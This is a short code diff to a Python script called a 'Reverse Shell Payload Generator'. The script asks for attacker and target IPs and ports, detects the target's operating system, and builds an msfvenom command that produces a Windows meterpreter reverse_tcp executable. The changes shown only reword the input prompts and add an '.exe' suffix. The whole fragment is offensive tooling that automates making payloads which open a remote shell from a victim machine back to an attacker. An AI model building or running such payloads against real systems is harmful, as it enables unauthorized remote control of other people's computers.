@@ -174,8 +174,8 @@ import subprocess
 print("Welcome to the Reverse Shell Payload Generator")
 filename = input("Please enter the name you want for the file: ")
 # Get info from user
-attackerIP = input("Please enter the IP of the attacker machine: ")
-attackerPort = input("Please enter the port of the attacker machine: ")
+attackerIP = input("Please enter the IP of the attacker machine(IPv4 format): ")
+attackerPort = input("Please enter the port of the attacker machine(1 - 65535): ")
 
 # Enumerate target
 targetIP = input("Please enter the IP of the target machine: ")
@@ -190,7 +190,7 @@ if osInfo.find("windows") != -1:
     #print("i found windows")
     os = "windows"
     print(os)
-    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename)
+    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename+".exe")
 
 elif osInfo.find("linux") != -1:
     os = "linux"
